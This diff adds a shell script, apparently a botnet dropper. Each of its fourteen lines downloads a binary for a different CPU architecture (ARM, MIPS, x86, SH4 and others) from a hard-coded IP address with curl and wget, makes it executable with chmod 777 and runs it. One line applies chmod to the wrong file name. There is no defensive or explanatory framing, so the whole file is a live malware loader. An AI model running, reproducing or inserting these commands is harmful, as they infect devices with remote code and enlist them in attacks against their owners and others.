@@ -1,0 +1,14 @@
+rm -rf arm4; curl -O http://179.43.175.5/bins1/arm4; wget http://179.43.175.5/bins1/arm4; chmod 777 arm4; ./arm4 server
+rm -rf arm5; curl -O http://179.43.175.5/bins1/arm5; wget http://179.43.175.5/bins1/arm5; chmod 777 arm5; ./arm5 server
+rm -rf arm6; curl -O http://179.43.175.5/bins1/arm6; wget http://179.43.175.5/bins1/arm6; chmod 777 arm6; ./arm6 server
+rm -rf arm7; curl -O http://179.43.175.5/bins1/arm7; wget http://179.43.175.5/bins1/arm7; chmod 777 arm7; ./arm7 server
+rm -rf i686; curl -O http://179.43.175.5/bins1/i686; wget http://179.43.175.5/bins1/i686; chmod 777 i686; ./i686 server
+rm -rf i586; curl -O http://179.43.175.5/bins1/i586; wget http://179.43.175.5/bins1/i586; chmod 777 i586; ./i586 server
+rm -rf x86_64; curl -O http://179.43.175.5/bins1/x86_64; wget http://179.43.175.5/bins1/x86_64; chmod 777 x86_64; ./x86_64 server
+rm -rf x86; curl -O http://179.43.175.5/bins1/x86; wget http://179.43.175.5/bins1/x86; chmod 777 x86; ./x86 server
+rm -rf arc; curl -O http://179.43.175.5/bins1/arc; wget http://179.43.175.5/bins1/arc; chmod 777 x86; ./arc server
+rm -rf mips; curl -O http://179.43.175.5/bins1/mips; wget http://179.43.175.5/bins1/mips; chmod 777 mips; ./mips server
+rm -rf mpsl; curl -O http://179.43.175.5/bins1/mpsl; wget http://179.43.175.5/bins1/mpsl; chmod 777 mpsl; ./mpsl server
+rm -rf m68k; curl -O http://179.43.175.5/bins1/m68k; wget http://179.43.175.5/bins1/m68k; chmod 777 m68k; ./m68k server
+rm -rf spc; curl -O http://179.43.175.5/bins1/spc; wget http://179.43.175.5/bins1/spc; chmod 777 spc; ./spc server
+rm -rf sh4; curl -O http://179.43.175.5/bins1/sh4; wget http://179.43.175.5/bins1/sh4; chmod 777 sh4; ./sh4 server
